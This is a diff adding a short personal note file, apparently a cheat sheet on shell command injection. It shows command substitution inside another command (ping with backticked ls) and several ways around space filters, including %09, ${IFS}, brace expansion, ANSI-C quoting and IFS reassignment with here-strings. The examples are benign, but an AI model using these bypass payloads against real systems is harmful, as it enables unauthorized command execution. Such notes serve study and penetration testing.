@@ -1,0 +1,20 @@
+* Run commands in command
+
+@code bash
+ping `ls`
+@end
+
+* Filter bypass
+
+`%09`
+
+`${IFS}`
+
+`{echo,hello,world}` (bash)
+
+`$'hello\x20world'`
+
+@code bash
+IFS=,;`cat<<<hello,world`
+IFS=.;`cat<<<hello.world`
+@end
